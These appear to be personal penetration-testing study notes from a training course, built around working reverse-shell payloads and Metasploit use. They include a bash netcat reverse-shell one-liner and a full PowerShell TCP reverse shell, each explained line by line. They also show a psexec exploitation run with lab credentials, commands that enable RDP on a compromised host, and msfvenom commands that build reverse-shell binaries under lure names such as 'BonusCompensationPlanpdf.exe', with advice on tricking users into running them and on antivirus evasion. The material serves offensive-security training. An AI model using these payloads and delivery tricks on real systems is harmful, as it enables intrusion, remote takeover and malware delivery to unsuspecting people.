### Introduction to Payloads

```
# In computing, the payload is the intended message. 
# In information security, the payload is the command and/or code that exploits the vulnerability in an OS and/or application. 
# The payload is the command and/or code that performs the malicious action from a defensive perspective.


# Well-knonwn payload example of reverse-shell init:

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f

# Break down by components (It's often copied & pasted but not often understood):

rm -f /tmp/f;                   # Removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files.
mkfifo /tmp/f;                  # Makes a FIFO named pipe file at the location specified. /tmp/f is the FIFO named pipe file.
cat /tmp/f |                    # Concatenates the FIFO named pipe file /tmp/f, the pipe (|) connects the standard output 
                                # of cat /tmp/f to the standard input of the command that comes after the pipe (|).
/bin/bash -i 2>&1 |             # Specifies the command language interpreter using the -i option to ensure the shell is interactive.
                                # 2>&1 ensures the std error and std out data streams (2)(1) are redirected to the command following the pipe (|).
nc 10.10.14.12 7777 > /tmp/f    # Uses Netcat to send a connection to our attack host 10.10.14.12 listening on port 7777.
                                # The output will be redirected (>) to /tmp/f, serving the Bash shell to our waiting Netcat listener 
                                # when the reverse shell one-liner command is executed
```

### PowerShell One-liner Explained

```
# Powershell One-liner
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Calling PowerShell with no profile (nop) and executes the command/script block (-c) contained in the quotes.
powershell -nop -c              

# Binding A Socket. Sets/evaluates the variable $client equal to (=) the New-Object cmdlet, 
# which creates an instance of the System.Net.Sockets.TCPClient .NET framework object.
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);

# Empty Byte Stream. Creates a byte type array ([]) called $bytes that returns 65,535 zeros as the values in the array.
# This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.
[byte[]]$bytes = 0..65535|%{0}; 

# Stream Parameters. Starts a while loop containing the $i variable set equal to (=) the .NET framework Stream.Read ($stream.Read) method.
# The parameters: buffer ($bytes), offset (0), and count ($bytes.Length) are defined inside the parentheses of the method.
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)

# Set The Byte Encoding.
# Sets/evaluates the variable $data equal to (=) an ASCII encoding .NET framework class that 
# will be used in conjunction with the GetString method to encode the byte stream ($bytes) into ASCII. 
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);

# Invoke-Expression. 
# Sets/evaluates the variable $sendback equal to (=) the Invoke-Expression (iex) cmdlet against the $data variable, 
# then redirects the standard error (2>) & standard output (1) through a pipe (|) to the Out-String cmdlet which converts input objects into strings.
$sendback = (iex $data 2>&1 | Out-String ); 

# Show Working Directory
# Sets/evaluates the variable $sendback2 equal to (=) the $sendback variable plus (+) the string PS ('PS') 
# plus + path to the working directory ((pwd).path) plus (+) the string '> '.
$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';

# Sets Sendbyte.
# Sets/evaluates the variable $sendbyte equal to (=) the ASCII encoded byte stream that will use a TCP client 
# to initiate a PowerShell session with a Netcat listener running on the attack box.
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}

# Terminate TCP Connection
# This is the TcpClient.Close method that will be used when the connection is terminated.#
$client.Close()"
```

```
# The one-liner we just examined together can also be executed in the form of a PowerShell scripts (.ps1). 
# Many examples of PS (Win Only) payloads and shells can be find on nishang project, link below:

### Automating Payloads & Delivery with Metasploit

```
# Metasploit is an automated attack framework developed by Rapid7 that streamlines the process of exploiting vulnerabilities 
# through the use of pre-built modules that contain easy-to-use options to exploit vulnerabilities and 
# deliver payloads to gain a shell on a vulnerable system. 
```

### Practicing with Metasploit

```
nmap -sC -sV -Pn 10.129.164.25                  # First making scan with namp agains target host
msf6 > search smb                               # Search for Win SMB exploits, as we found 445 port with this service in scan before
msf6 > use 56                                   # We choose 56th `exploit/windows/smb/psexec` exploit module for this case from list
msf6 exploit(windows/smb/psexec) > options      # Check options of module for required options and set them up
set RHOSTS 10.129.180.71                        # Set Target host IP
set SHARE ADMIN$                                # Set SMB Share to connect
set SMBPass HTB_@cademy_stdnt!                  # Set password to auth 
set SMBUser htb-student                         # Set username to auth
set LHOST 10.10.14.222                          # Set your localhost (pentest host)
msf6 > check                                    # Double-check that this module can exploit target host
msf6 > run                                      # Start explotation  OR 
msf6 > exploit                                  # Start explotation
output:
meterpreter >                                   # Meterpreter shell starting inside on target host.

# Keep in mind that Meterpreter is a payload that uses in-memory DLL injection to stealthfully establish 
# a communication channel between an attack box and a target. 
# The proper credentials and attack vector can give us the ability to upload & download files, 
# execute system commands, run a keylogger, create/start/stop services, manage processes, and more.

# More info about psexec module and other modules on rapid7 docs:
```

[psexec](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/) 

```
# Meterpreter shell sessions allow us to issue a set of commands we can use to interact with the target system. 
# We can use the ? to see a list of commands we can use. 
# We will notice limitations with the Meterpreter shell, 
# so it is good to attempt to use the shell command to drop into a system-level shell 
# if we need to work with the complete set of system commands native to our target.

meterpreter > shell                                       # Starting Win PS shell instead of Meterpreter shell

### Switch on RDP after SMB exploit connection

```
# On target host:
# Load powershell extension:
(Meterpreter 1)(C:\Users\htb-student\Documents) > load powershell

# Check ports:
> powershell_execute "Get-NetTCPConnection | Select-Object -Property LocalAddress, LocalPort, State, RemoteAddress, RemotePort, OwningProcess | Format-Table"

# Turn ON RDP, after check ports again to see new listen 3389 port:
> powershell_execute "Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0"

# Enable Firewall for RDP:
> powershell_execute "Enable-NetFirewallRule -DisplayGroup "Remote Desktop""

# Double check that service is runnig well:
> powershell_execute "Start-Service -Name TermService"


# ON Localhost:
xfreerdp /v:10.129.201.160 /u:htb-student /p:HTB_@cademy_stdnt!       # Connect via xreerdp with creds
```

### MSFvenom

```
# Use MSFvenom to craft a payload and send it via email message or other means of social engineering to drive that user to execute the file.
# In addition to providing a payload with flexible delivery options, 
# MSFvenom also allows us to encrypt & encode payloads to bypass common anti-virus detection signatures.

msfvenom -l payloads                                # List payloads on host with msfvenom
output:

```

### Staged vs. Stageless Payloads

```
# Staged payloads create a way for us to send over more components of our attack. 
# We can think of it like we are "setting the stage" for something even more useful.
# Take for example this payload linux/x86/shell/reverse_tcp. 
# When run using an exploit module in Metasploit, this payload will send a small stage that will be executed on the target 
# and then call back to the attack box to download the remainder of the payload over the network, 
# then executes the shellcode to establish a reverse shell.

# Stageless payloads do not have a stage. 
# Take for example this payload linux/zarch/meterpreter_reverse_tcp. 
# Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. 
# This could benefit us in environments where we do not have access to much bandwidth and latency can interfere.

# Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. 
# In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network 
# to execute the payload, especially if we deliver it by employing social engineering. 

# Now that we understand the differences between a staged and stageless payload, we can identify them within Metasploit. 
# The answer is simple.

linux/x86/shell/reverse_tcp              # Staged payload. So /shell/ is a stage to send, and /reverse_tcp is another. 
windows/meterpreter/reverse_tcp          # Another example of staged payload.
windows/meterpreter_reverse_tcp          # Stageless payload.
``` 

### Building A Stageless Payload

```
# Now let's build a simple stageless payload with msfvenom and break down the command.

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf    # Creating payload in file with msfvenom
output:
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes

-p                               # Create payload
linux/x64/shell_reverse_tcp      # Using stagell payload with option LHOST and LPORT
-f                               # Specifying the format the generated binary will be in.
> createbackup.elf               # Creates the .elf binary and names the file createbackup.

# Note: We can name this file whatever we want. 
# Ideally, we would call it something inconspicuous and/or something someone would be tempted to download and execute.


# Imagine for a moment: the target machine is an Ubuntu box that an IT admin uses to manage network devices 
# (hosting configuration scripts, accessing routers & switches, etc.). 
# We could get them to click the file in an email we sent because they were carelessly using this system as if it was a personal computer or workstation.

# We would have a listener ready to catch the connection on the attack box side upon successful execution.
# Connection Established:
sudo nc -lvnp 443
output:
Listening on 0.0.0.0 443

### Building a simple Stageless Payload for a Windows system

```
# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe     # Create payload in .exe file this time

# This is another situation where we need to be creative in getting this payload delivered to a target system. 
# Without any encoding or encryption, the payload in this form would almost certainly be detected by Windows Defender AV. 
# (Check Archiving method in 089.metasploit-additional.md file it will make an evasion from potential AV and IDP/APS)

# If the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session.

sudo nc -lvnp 443
output:
Listening on 0.0.0.0 443
